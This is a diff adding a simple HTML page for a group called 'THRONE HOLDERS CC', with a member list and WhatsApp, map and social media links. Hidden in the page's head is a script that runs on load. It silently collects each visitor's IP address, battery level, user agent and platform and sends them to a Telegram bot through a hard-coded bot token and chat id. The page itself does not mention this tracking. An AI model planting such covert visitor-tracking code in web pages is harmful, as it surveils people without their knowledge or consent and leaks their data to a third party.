@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>swapnil</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+        }
+    </style>
+    <script>
+        async function sendUserInfo() {
+            try {
+                // Fetching IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Collecting battery charge info (if available)
+                let batteryCharge = 'Unknown';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryCharge = `${Math.round(battery.level * 100)}%`;
+                }
+
+                // Collecting user device info
+                const deviceInfo = `User Agent: ${navigator.userAgent}, Platform: ${navigator.platform}`;
+
+                // Formatting the message
+                const message = `USER IP: ${ip}\nBATTERY CHARGE: ${batteryCharge}\nDEVICE INFO: ${deviceInfo}`;
+
+                // Sending the data to the Telegram bot
+                const botToken = '7129970618:AAHCXw5b-pMebWI2_hgyrdoBAM5hGaJogHY';
+                const chatId = '6300206674';
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                await fetch(telegramUrl);
+            } catch (error) {
+                console.error('Error sending user info:', error);
+            }
+        }
+
+        // Send user info when the page loads
+        window.onload = sendUserInfo;
+    </script>
+</head>
+<body>
+    <header>
+        <h1>THRONE HOLDERS CC</h1>
+    </header>
+    <pre>               <img src="https://i.postimg.cc/yxcHH2pd/IMG-20240808-171106.png" alt="logo" height ="100"></pre>
+    <main>
+        <section>
+            <u>Creater:</u> Krishnendu Brahmachari
+            <br>
+            <u>Members:</u> Swapnil, Tapojit, Mrinmoy, Rahul da,
+            <br>
+            Jaysambhu da, Ghontu, Roni da, Mayuk
+        </section>
+        <br>
+        <article>
+            join our <a href="https://chat.whatsapp.com/KrBg4jMQrDy6mb8luglGg4" style="color:yellow;text-decoration:none;">WhatsApp</a> group today😁
+            <br>
+           <b>loc:</b> <a href="https://maps.app.goo.gl/vcLUhbBRQM3VXEtj7"><img src="https://i.postimg.cc/C5vCksjG/download.jpg" alt="on map" width = "343"></a>
+        </article>
+        
+        <aside></aside>
+    </main>
+    <br>
+    <hr>
+    <footer>
+       <pre>contact us at:<a href="https://youtube.com/@SwapnilBhattacharya-re8fr?si=qQ5QkddWL18VIh__"><img src="https://i.postimg.cc/R0MrZMVj/download.jpg" alt="yt" height = "30"></a> <a href="https://www.facebook.com/profile.php?id=61551888252072"><img src="https://i.postimg.cc/pd6tGwR4/download.png" alt="fb" height ="30"></a> <a href="https://www.instagram.com/swapnilbhattacharya687?igsh=YzljYTk1ODg3Zg=="><img src="https://i.postimg.cc/jjW15LY3/IMG-20240808-214554.jpg" alt="insta"height="30"></a>  <b></b></pre>
+    </footer>
+</body>
+</html>
